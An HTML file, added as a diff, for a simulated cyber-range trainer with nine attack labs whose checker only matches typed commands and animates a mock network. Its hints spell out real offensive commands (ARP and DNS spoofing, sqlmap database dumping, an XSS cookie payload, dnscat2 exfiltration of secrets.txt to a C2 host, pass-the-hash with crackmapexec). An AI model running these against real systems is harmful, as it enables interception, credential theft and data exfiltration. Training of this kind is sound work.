@@ -1,0 +1,617 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CyberDefend Interactive Range</title>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Space+Grotesk:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <style>
+        :root {
+            --bg: #0a0e14;
+            --bg-panel: #11161f;
+            --bg-terminal: #05070a;
+            --border: #2a3344;
+            --text: #c5d0e0;
+            --text-muted: #6b7888;
+            --accent: #00ff9d;
+            --danger: #ff4757;
+            --warning: #ffa502;
+            --info: #1e90ff;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Space Grotesk', sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            display: flex;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        /* Sidebar */
+        .sidebar {
+            width: 280px;
+            background: var(--bg-panel);
+            border-right: 1px solid var(--border);
+            display: flex;
+            flex-direction: column;
+            flex-shrink: 0;
+        }
+
+        .sidebar-header {
+            padding: 20px;
+            border-bottom: 1px solid var(--border);
+            text-align: center;
+        }
+
+        .sidebar-header h1 {
+            color: var(--accent);
+            font-size: 1.2rem;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .lab-list {
+            flex: 1;
+            overflow-y: auto;
+            padding: 10px;
+        }
+
+        .lab-btn {
+            width: 100%;
+            background: transparent;
+            border: 1px solid transparent;
+            color: var(--text);
+            padding: 15px;
+            textAlign: left;
+            cursor: pointer;
+            border-radius: 6px;
+            margin-bottom: 5px;
+            transition: 0.2s;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-family: 'Space Grotesk', sans-serif;
+            font-size: 0.95rem;
+        }
+
+        .lab-btn:hover { background: rgba(255,255,255,0.05); }
+        .lab-btn.active { background: rgba(0, 255, 157, 0.1); border-color: var(--accent); }
+        .lab-btn i { width: 20px; text-align: center; color: var(--info); }
+        .lab-btn.completed i { color: var(--accent); }
+
+        /* Main Area */
+        .main {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+
+        .top-bar {
+            height: 50px;
+            background: var(--bg-panel);
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            padding: 0 20px;
+            justify-content: space-between;
+        }
+
+        .top-bar h2 { font-size: 1.1rem; }
+        .top-bar .status { color: var(--accent); font-family: 'JetBrains Mono'; font-size: 0.85rem; }
+
+        /* Visual Canvas */
+        .canvas-area {
+            flex: 1;
+            padding: 20px;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            background: radial-gradient(circle at center, #131922 0%, #0a0e14 100%);
+        }
+
+        .scenario-box {
+            background: var(--bg-panel);
+            border: 1px solid var(--border);
+            border-left: 4px solid var(--info);
+            padding: 15px;
+            margin-bottom: 20px;
+            border-radius: 4px;
+        }
+
+        .scenario-box h3 { margin-bottom: 5px; color: var(--info); }
+        .scenario-box p { font-size: 0.9rem; color: var(--text-muted); }
+
+        .visual-stage {
+            flex: 1;
+            background: var(--bg-terminal);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            position: relative;
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        /* Network Nodes */
+        .node {
+            position: absolute;
+            background: var(--bg-panel);
+            border: 1px solid var(--border);
+            padding: 10px 15px;
+            border-radius: 6px;
+            text-align: center;
+            font-size: 0.85rem;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+            z-index: 2;
+        }
+        .node i { display: block; font-size: 24px; margin-bottom: 5px; }
+        .node.attacker { border-color: var(--danger); color: var(--danger); }
+        .node.victim { border-color: var(--info); color: var(--info); }
+        .node.server { border-color: var(--text-muted); color: var(--text-muted); }
+        .node.compromised { border-color: var(--warning) !important; color: var(--warning) !important; animation: pulse 2s infinite; }
+
+        @keyframes pulse { 0%, 100% { box-shadow: 0 0 0 0 rgba(255, 165, 2, 0.4); } 50% { box-shadow: 0 0 0 10px rgba(255, 165, 2, 0); } }
+
+        /* SVG Lines */
+        .svg-layer { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
+        .link { stroke: var(--border); stroke-width: 2; stroke-dasharray: 5; }
+        .link.active { stroke: var(--danger); stroke-dasharray: 10; animation: dash 1s linear infinite; }
+        @keyframes dash { to { stroke-dashoffset: -20; } }
+
+        /* Web Mockup */
+        .web-mockup { width: 80%; max-width: 400px; background: #fff; color: #333; border-radius: 6px; overflow: hidden; }
+        .web-header { background: #eee; padding: 10px; font-weight: bold; border-bottom: 1px solid #ccc; }
+        .web-body { padding: 20px; }
+        .input-field { width: 100%; padding: 8px; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+        .btn { background: #007bff; color: #fff; border: none; padding: 8px 15px; border-radius: 4px; cursor: pointer; }
+        .db-table { width: 100%; border-collapse: collapse; margin-top: 15px; font-size: 0.8rem; }
+        .db-table th, .db-table td { border: 1px solid #ddd; padding: 5px; text-align: left; }
+
+        /* Terminal */
+        .terminal {
+            height: 200px;
+            background: var(--bg-terminal);
+            border-top: 1px solid var(--border);
+            display: flex;
+            flex-direction: column;
+        }
+
+        .terminal-output {
+            flex: 1;
+            padding: 10px;
+            overflow-y: auto;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+            color: var(--text);
+            line-height: 1.4;
+        }
+
+        .terminal-input-line {
+            display: flex;
+            align-items: center;
+            padding: 10px;
+            border-top: 1px solid var(--border);
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .prompt { color: var(--accent); margin-right: 10px; }
+
+        input[type="text"] {
+            background: transparent;
+            border: none;
+            outline: none;
+            color: var(--text);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+            width: 100%;
+        }
+
+        .success { color: var(--accent); }
+        .error { color: var(--danger); }
+        .warn { color: var(--warning); }
+    </style>
+</head>
+<body>
+
+    <aside class="sidebar">
+        <div class="sidebar-header">
+            <h1>Cyber Range</h1>
+        </div>
+        <div class="lab-list" id="labList">
+            <!-- Populated by JS -->
+        </div>
+    </aside>
+
+    <div class="main">
+        <div class="top-bar">
+            <h2 id="labTitle">Select a Lab</h2>
+            <div class="status" id="labStatus">Status: Idle</div>
+        </div>
+
+        <div class="canvas-area">
+            <div class="scenario-box">
+                <h3 id="scenarioTitle">Welcome</h3>
+                <p id="scenarioDesc">Select a lab from the sidebar to begin training.</p>
+            </div>
+
+            <div class="visual-stage" id="visualStage">
+                <div style="color: var(--text-muted); text-align: center;">
+                    <i class="fa-solid fa-shield-halved" style="font-size: 48px; margin-bottom: 10px;"></i>
+                    <p>CyberDefend Interactive Simulator</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="terminal">
+            <div class="terminal-output" id="termOut">
+                <div class="success">[System] CyberDefend Terminal Initialized.</div>
+                <div>[System] Type 'help' for available commands in current lab.</div>
+            </div>
+            <div class="terminal-input-line">
+                <span class="prompt">root@cyberdefend:~$</span>
+                <input type="text" id="termIn" autofocus autocomplete="off">
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const labs = [
+            {
+                id: 1,
+                title: "MITM (ARP Spoofing)",
+                icon: "fa-user-secret",
+                scenario: "Poison the ARP cache of the Victim (10.0.0.5) and the Gateway (10.0.0.1) to intercept traffic.",
+                cmdHint: "arpspoof -i eth0 -t [target] [gateway]",
+                state: { s1: false, s2: false },
+                html: () => `
+                    <div class="node victim" style="top:20%; left:10%;"><i class="fa-solid fa-desktop"></i>Victim<br>10.0.0.5</div>
+                    <div class="node attacker" style="top:50%; left:45%;"><i class="fa-solid fa-user-graduate"></i>Attacker<br>You</div>
+                    <div class="node server" style="top:20%; right:10%;"><i class="fa-solid fa-router"></i>Gateway<br>10.0.0.1</div>
+                    <svg class="svg-layer">
+                        <line id="line1" x1="15%" y1="25%" x2="50%" y2="55%" class="link" />
+                        <line id="line2" x1="50%" y1="55%" x2="85%" y2="25%" class="link" />
+                        <line id="lineOrig" x1="15%" y1="25%" x2="85%" y2="25%" class="link" style="stroke-dasharray:0; opacity:0.3;" />
+                    </svg>
+                `,
+                check(cmd, state) {
+                    if (cmd.includes("arpspoof") && cmd.includes("eth0") && cmd.includes("10.0.0.5") && cmd.includes("10.0.0.1")) {
+                        state.s1 = true;
+                        return { success: true, msg: "Spoofing Victim -> Gateway..." };
+                    }
+                    if (cmd.includes("arpspoof") && cmd.includes("eth0") && cmd.includes("10.0.0.1") && cmd.includes("10.0.0.5")) {
+                        state.s2 = true;
+                        return { success: true, msg: "Spoofing Gateway -> Victim..." };
+                    }
+                    return { success: false, msg: "Invalid command. Check syntax." };
+                },
+                onComplete: () => {
+                    document.getElementById('line1').classList.add('active');
+                    document.getElementById('line2').classList.add('active');
+                    document.getElementById('lineOrig').style.opacity = '0';
+                    return "MITM established. Traffic flowing through Attacker.";
+                }
+            },
+            {
+                id: 2,
+                title: "DNS Spoofing",
+                icon: "fa-route",
+                scenario: "Redirect 'bank.com' traffic from the Victim to your fake server using Ettercap.",
+                cmdHint: "ettercap -T -M arp -P dns_spoof",
+                state: { done: false },
+                html: () => `
+                    <div class="node victim" style="top:10%; left:40%;"><i class="fa-solid fa-desktop"></i>Victim</div>
+                    <div class="node server" style="bottom:10%; left:10%;"><i class="fa-solid fa-server"></i>Real Bank<br>1.1.1.1</div>
+                    <div class="node attacker" style="bottom:10%; right:10%;"><i class="fa-solid fa-server"></i>Fake Bank<br>10.0.0.6</div>
+                    <svg class="svg-layer">
+                        <line id="realLink" x1="45%" y1="20%" x2="20%" y2="80%" class="link" />
+                        <line id="fakeLink" x1="45%" y1="20%" x2="80%" y2="80%" class="link" style="opacity:0.2;" />
+                    </svg>
+                `,
+                check(cmd, state) {
+                    if (cmd.includes("ettercap") && cmd.includes("-T") && cmd.includes("dns_spoof")) {
+                        state.done = true;
+                        return { success: true, msg: "Starting DNS Spoofing..." };
+                    }
+                    return { success: false, msg: "Syntax error. Did you enable the dns_spoof plugin?" };
+                },
+                onComplete: () => {
+                    document.getElementById('realLink').style.opacity = '0.2';
+                    document.getElementById('fakeLink').style.opacity = '1';
+                    document.getElementById('fakeLink').classList.add('active');
+                    return "DNS Spoofing active! Victim is visiting Fake Bank.";
+                }
+            },
+            {
+                id: 3,
+                title: "DHCP Starvation",
+                icon: "fa-network-wired",
+                scenario: "Exhaust the DHCP server's IP pool using Yersinia.",
+                cmdHint: "yersinia -I eth0 -attack 2",
+                state: { done: false },
+                html: () => `
+                    <div class="node attacker" style="top:40%; left:10%;"><i class="fa-solid fa-user-graduate"></i>Attacker</div>
+                    <div class="node server" id="dhcpServer" style="top:40%; right:20%;"><i class="fa-solid fa-server"></i>DHCP Server<br>Pool: 10.0.0.100-110</div>
+                `,
+                check(cmd, state) {
+                    if (cmd.includes("yersinia") && cmd.includes("eth0") && (cmd.includes("attack 2") || cmd.includes("2"))) {
+                        state.done = true;
+                        return { success: true, msg: "Flooding DHCP Discover packets..." };
+                    }
+                    return { success: false, msg: "Use yersinia interface and attack mode 2." };
+                },
+                onComplete: () => {
+                    const srv = document.getElementById('dhcpServer');
+                    srv.classList.add('compromised');
+                    srv.innerHTML = '<i class="fa-solid fa-server"></i>DHCP Server<br>POOL EXHAUSTED';
+                    return "DHCP Starvation complete. DoS achieved.";
+                }
+            },
+            {
+                id: 4,
+                title: "Wireless Evil Twin",
+                icon: "fa-wifi",
+                scenario: "Create a rogue Access Point with the same SSID to capture handshakes.",
+                cmdHint: "airbase-ng -a [MAC] -e \"Corp_WiFi\" wlan0mon",
+                state: { done: false },
+                html: () => `
+                    <div class="node server" style="top:10%; left:30%;"><i class="fa-solid fa-wifi"></i>Real AP<br>Corp_WiFi</div>
+                    <div class="node attacker" style="bottom:10%; left:30%;"><i class="fa-solid fa-wifi"></i>Rogue AP<br>Corp_WiFi</div>
+                    <div class="node victim" style="top:50%; right:20%;"><i class="fa-solid fa-mobile-screen"></i>Client</div>
+                `,
+                check(cmd, state) {
+                    if (cmd.includes("airbase-ng") && cmd.includes("Corp_WiFi") && cmd.includes("wlan0mon")) {
+                        state.done = true;
+                        return { success: true, msg: "Rogue AP started..." };
+                    }
+                    return { success: false, msg: "Ensure you specify MAC, SSID, and interface." };
+                },
+                onComplete: () => {
+                    const client = document.querySelector('.node.victim');
+                    client.classList.add('compromised');
+                    return "Evil Twin active. Client deauthenticated and connected to Rogue AP.";
+                }
+            },
+            {
+                id: 5,
+                title: "SQL Injection",
+                icon: "fa-database",
+                scenario: "Exploit the login form to dump the admin credentials.",
+                cmdHint: "sqlmap -u \"http://target/login\" --data=\"user=a&pass=b\" --dump",
+                state: { done: false },
+                html: () => `
+                    <div class="web-mockup">
+                        <div class="web-header">Bank Login Portal</div>
+                        <div class="web-body">
+                            <input type="text" class="input-field" placeholder="Username" value="admin">
+                            <input type="password" class="input-field" placeholder="Password" value="********">
+                            <button class="btn">Login</button>
+                            <div id="dbResult" style="margin-top:15px; color:red; font-size:0.8rem;"></div>
+                        </div>
+                    </div>
+                `,
+                check(cmd, state) {
+                    if (cmd.includes("sqlmap") && cmd.includes("-u") && cmd.includes("--dump") && cmd.includes("--data")) {
+                        state.done = true;
+                        return { success: true, msg: "Testing parameter 'user'..." };
+                    }
+                    return { success: false, msg: "Ensure you include URL, POST data, and dump flag." };
+                },
+                onComplete: () => {
+                    document.getElementById('dbResult').innerHTML = `
+                        <h4 style="color:black; margin-bottom:5px;">DUMPED DATABASE:</h4>
+                        <table class="db-table" style="color:black;">
+                            <tr><th>ID</th><th>User</th><th>Password</th></tr>
+                            <tr><td>1</td><td>admin</td><td>P@ssw0rd123!</td></tr>
+                        </table>
+                    `;
+                    return "Database dumped successfully. Admin credentials found!";
+                }
+            },
+            {
+                id: 6,
+                title: "Cross-Site Scripting (XSS)",
+                icon: "fa-code",
+                scenario: "Inject a payload into the search box to steal cookies.",
+                cmdHint: "<script>alert(document.cookie)</script>",
+                state: { done: false },
+                html: () => `
+                    <div class="web-mockup">
+                        <div class="web-header">Search Page</div>
+                        <div class="web-body">
+                            <input type="text" class="input-field" placeholder="Search..." id="xssInput">
+                            <button class="btn">Search</button>
+                            <div id="xssResult" style="margin-top:15px;"></div>
+                        </div>
+                    </div>
+                `,
+                check(cmd, state) {
+                    const clean = cmd.toLowerCase().replace(/\s/g, "");
+                    if (clean.includes("<script>alert(document.cookie)</script>") || clean.includes("<imgsrc=xonerror=alert(document.cookie)>")) {
+                        state.done = true;
+                        document.getElementById('xssInput').value = cmd;
+                        return { success: true, msg: "Executing payload..." };
+                    }
+                    return { success: false, msg: "Try a script tag that alerts the cookie." };
+                },
+                onComplete: () => {
+                    document.getElementById('xssResult').innerHTML = `
+                        <div style="background:#ff4757; color:white; padding:10px; border-radius:4px; font-family:monospace;">
+                            POPUP!<br>session_id=cyberdefend_secret_12345
+                        </div>
+                    `;
+                    return "XSS Executed! Session cookie captured.";
+                }
+            },
+            {
+                id: 7,
+                title: "Data Exfiltration (DNS)",
+                icon: "fa-arrow-right-from-bracket",
+                scenario: "Smuggle 'secrets.txt' out of the network via DNS tunneling to bypass firewalls.",
+                cmdHint: "dnscat2 --host 10.0.0.1 --file secrets.txt",
+                state: { done: false },
+                html: () => `
+                    <div class="node attacker" style="top:40%; left:10%;"><i class="fa-solid fa-file-shield"></i>secrets.txt</div>
+                    <div class="node server" style="top:40%; right:20%;"><i class="fa-solid fa-server"></i>C2 Server<br>10.0.0.1</div>
+                    <svg class="svg-layer">
+                        <path id="dnsTunnel" d="M 20% 50% Q 50% 10%, 80% 50%" fill="transparent" class="link" />
+                    </svg>
+                `,
+                check(cmd, state) {
+                    if (cmd.includes("dnscat2") && cmd.includes("--host") && cmd.includes("--file")) {
+                        state.done = true;
+                        return { success: true, msg: "Establishing DNS tunnel on port 53..." };
+                    }
+                    return { success: false, msg: "Syntax incorrect. Specify host and file." };
+                },
+                onComplete: () => {
+                    document.getElementById('dnsTunnel').classList.add('active');
+                    document.querySelector('.node.attacker').classList.add('compromised');
+                    return "Exfiltration complete. Data sent via DNS queries.";
+                }
+            },
+            {
+                id: 8,
+                title: "Lateral Movement (PTH)",
+                icon: "fa-arrows-left-right",
+                scenario: "Move laterally to the Database Server (10.0.0.6) using Pass-the-Hash with CrackMapExec.",
+                cmdHint: "crackmapexec smb 10.0.0.6 -u admin -H aad3b...",
+                state: { done: false },
+                html: () => `
+                    <div class="node compromised" style="top:40%; left:10%; border-color:var(--accent); color:var(--accent);"><i class="fa-solid fa-server"></i>Web Server<br>[Pwned]</div>
+                    <div class="node server" id="dbTarget" style="top:40%; right:20%;"><i class="fa-solid fa-database"></i>DB Server<br>10.0.0.6</div>
+                `,
+                check(cmd, state) {
+                    if (cmd.includes("crackmapexec") && cmd.includes("smb") && cmd.includes("10.0.0.6") && cmd.includes("-u") && cmd.includes("-H")) {
+                        state.done = true;
+                        return { success: true, msg: "Sending SMB login request..." };
+                    }
+                    return { success: false, msg: "Invalid command. Check CME syntax." };
+                },
+                onComplete: () => {
+                    const target = document.getElementById('dbTarget');
+                    target.classList.remove('server');
+                    target.classList.add('compromised');
+                    target.innerHTML = '<i class="fa-solid fa-database"></i>DB Server<br>[Pwn3d!]';
+                    return "Pass-the-Hash successful! Lateral movement achieved.";
+                }
+            },
+            {
+                id: 9,
+                title: "Phishing (GoPhish)",
+                icon: "fa-fish",
+                scenario: "Launch the GoPhish server to send a phishing campaign to targets.",
+                cmdHint: "./gophish",
+                state: { done: false },
+                html: () => `
+                    <div class="node attacker" style="top:40%; left:10%;"><i class="fa-solid fa-server"></i>Attacker<br>GoPhish</div>
+                    <div class="node victim" style="top:40%; right:20%;"><i class="fa-solid fa-envelope"></i>Target Inbox</div>
+                `,
+                check(cmd, state) {
+                    if (cmd === "./gophish" || cmd === "gophish") {
+                        state.done = true;
+                        return { success: true, msg: "Starting GoPhish admin server on :3333..." };
+                    }
+                    return { success: false, msg: "Try executing the binary." };
+                },
+                onComplete: () => {
+                    const inbox = document.querySelector('.node.victim');
+                    inbox.classList.add('compromised');
+                    inbox.innerHTML = '<i class="fa-solid fa-envelope-open"></i>Target Inbox<br>Email Opened!';
+                    return "Campaign launched. Target clicked link and submitted credentials.";
+                }
+            }
+        ];
+
+        // Elements
+        const labList = document.getElementById('labList');
+        const labTitle = document.getElementById('labTitle');
+        const labStatus = document.getElementById('labStatus');
+        const scenarioTitle = document.getElementById('scenarioTitle');
+        const scenarioDesc = document.getElementById('scenarioDesc');
+        const visualStage = document.getElementById('visualStage');
+        const termOut = document.getElementById('termOut');
+        const termIn = document.getElementById('termIn');
+
+        let currentLab = null;
+        let completedCount = 0;
+
+        function init() {
+            labs.forEach(lab => {
+                const btn = document.createElement('button');
+                btn.className = 'lab-btn';
+                btn.id = `lab-${lab.id}`;
+                btn.innerHTML = `<i class="fa-solid ${lab.icon}"></i> ${lab.title}`;
+                btn.onclick = () => loadLab(lab);
+                labList.appendChild(btn);
+            });
+        }
+
+        function loadLab(lab) {
+            currentLab = JSON.parse(JSON.stringify(lab)); // Deep clone to reset state
+            currentLab.state = { ...lab.state }; // Reset state
+            currentLab.html = lab.html; // Reattach function
+            currentLab.check = lab.check;
+            currentLab.onComplete = lab.onComplete;
+
+            labTitle.textContent = lab.title;
+            labStatus.textContent = 'Status: Pending';
+            scenarioTitle.textContent = "Mission Brief";
+            scenarioDesc.textContent = lab.scenario;
+            
+            visualStage.innerHTML = currentLab.html();
+            termOut.innerHTML = `<div class="success">[System] Lab loaded: ${lab.title}</div><div>Hint: ${lab.cmdHint}</div>`;
+            
+            // Update active button
+            document.querySelectorAll('.lab-btn').forEach(b => b.classList.remove('active'));
+            document.getElementById(`lab-${lab.id}`).classList.add('active');
+        }
+
+        termIn.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter' && currentLab) {
+                const cmd = termIn.value.trim();
+                termOut.innerHTML += `<div><span class="success">root@cyberdefend:~$</span> ${cmd}</div>`;
+                
+                if (cmd.toLowerCase() === 'help') {
+                    termOut.innerHTML += `<div class="warn">Hint: ${currentLab.cmdHint}</div>`;
+                } else {
+                    const result = currentLab.check(cmd, currentLab.state);
+                    
+                    if (result.success) {
+                        termOut.innerHTML += `<div class="success">${result.msg}</div>`;
+                        
+                        // Check if all state objectives are true
+                        const allDone = Object.values(currentLab.state).every(v => v === true);
+                        
+                        if (allDone) {
+                            const completeMsg = currentLab.onComplete();
+                            termOut.innerHTML += `<div class="warn">[SUCCESS] ${completeMsg}</div>`;
+                            labStatus.textContent = 'Status: Completed';
+                            labStatus.style.color = 'var(--accent)';
+                            
+                            // Mark button as completed visually
+                            const btn = document.getElementById(`lab-${currentLab.id}`);
+                            if (!btn.classList.contains('completed')) {
+                                btn.classList.add('completed');
+                                completedCount++;
+                            }
+                        }
+                    } else {
+                        termOut.innerHTML += `<div class="error">${result.msg}</div>`;
+                    }
+                }
+                
+                termIn.value = '';
+                termOut.scrollTop = termOut.scrollHeight;
+            }
+        });
+
+        init();
+    </script>
+</body>
+</html>
